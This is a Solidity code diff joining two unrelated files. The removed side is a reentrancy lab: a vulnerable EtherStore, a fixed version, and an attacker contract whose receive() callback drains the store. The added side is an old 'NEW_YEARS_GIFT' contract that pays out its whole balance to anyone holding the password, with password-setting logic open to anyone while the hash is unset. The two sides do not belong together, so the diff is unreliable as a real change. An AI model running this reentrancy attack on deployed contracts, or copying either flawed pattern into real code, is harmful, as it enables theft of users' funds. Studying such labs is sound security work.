@@ -1,102 +1,69 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.18;
+pragma solidity ^0.4.19;
 
-import "forge-std/Test.sol";
+contract NEW_YEARS_GIFT
+{
+    string message;
 
-contract EtherStore {
-    mapping(address => uint256) public balances;
+    bool passHasBeenSet = false;
 
-    function deposit() public payable {
-        balances[msg.sender] += msg.value;
-    }
+    address sender;
 
-    function withdrawFunds(uint256 _weiToWithdraw) public {
-        require(balances[msg.sender] >= _weiToWithdraw);
-        (bool send, ) = msg.sender.call{value: _weiToWithdraw}("");
-        require(send, "send failed");
+    bytes32 public hashPass;
 
-        if (balances[msg.sender] >= _weiToWithdraw) {
-            balances[msg.sender] -= _weiToWithdraw;
+    function() public payable{}
+
+    function GetHash(bytes pass) public constant returns (bytes32) {return sha3(pass);}
+
+    function SetPass(bytes32 hash)
+    public
+    payable
+    {
+        if( (!passHasBeenSet&&(msg.value > 1 ether)) || hashPass==0x0 )
+        {
+            hashPass = hash;
+            sender = msg.sender;
         }
     }
-}
 
-contract EtherStoreB {
-    mapping(address => uint256) public balances;
-    bool internal locked;
-
-    modifier checkLock() {
-        require(!locked, "Locked");
-        locked = true;
-        _;
-        locked = false;
+    function SetMessage(string _message)
+    public
+    {
+        if(msg.sender==sender)
+        {
+            message =_message;
+        }
     }
 
-    function deposit() public payable {
-        balances[msg.sender] += msg.value;
+    function GetGift(bytes pass)
+    external
+    payable
+    returns (string)
+    {
+        if(hashPass == sha3(pass))
+        {
+            msg.sender.transfer(this.balance);
+            return message;
+        }
     }
 
-    function withdrawFunds(uint256 _weiToWithdraw) public checkLock {
-        require(balances[msg.sender] >= _weiToWithdraw);
-        balances[msg.sender] -= _weiToWithdraw;
-        (bool send, ) = msg.sender.call{value: _weiToWithdraw}("");
-        require(send, "send failed");
-    }
-}
-
-contract ContractTest is Test {
-    EtherStore store;
-    EtherStoreB storeB;
-    EtherStoreOperator operator;
-    EtherStoreOperator operatorB;
-
-    function setUp() public {
-        store = new EtherStore();
-        storeB = new EtherStoreB();
-        operator = new EtherStoreOperator(address(store));
-        operatorB = new EtherStoreOperator(address(storeB));
-        vm.deal(address(store), 5 ether);
-        vm.deal(address(storeB), 5 ether);
-        vm.deal(address(operator), 2 ether);
-        vm.deal(address(operatorB), 2 ether);
+    function Revoce()
+    public
+    payable
+    {
+        if(msg.sender==sender)
+        {
+            sender.transfer(this.balance);
+            message="";
+        }
     }
 
-    function testWithdrawal() public {
-        operator.Operator();
-    }
-
-    function testWithdrawalB() public {
-        operatorB.Operator();
-    }
-}
-
-contract EtherStoreOperator is Test {
-    EtherStore store;
-
-    constructor(address _store) {
-        store = EtherStore(_store);
-    }
-
-    function Operator() public {
-        console.log("EtherStore balance", address(store).balance);
-
-        store.deposit{value: 1 ether}();
-
-        console.log(
-            "Deposited 1 Ether, EtherStore balance",
-            address(store).balance
-        );
-        store.withdrawFunds(1 ether);
-
-        console.log("Operator contract balance", address(this).balance);
-        console.log("EtherStore balance", address(store).balance);
-    }
-
-    receive() external payable {
-        console.log("Operator contract balance", address(this).balance);
-        console.log("EtherStore balance", address(store).balance);
-        if (address(store).balance >= 1 ether) {
-            store.withdrawFunds(1 ether);
+    function PassHasBeenSet(bytes32 hash)
+    public
+    {
+        if(msg.sender==sender&&hash==hashPass)
+        {
+           passHasBeenSet=true;
         }
     }
 }
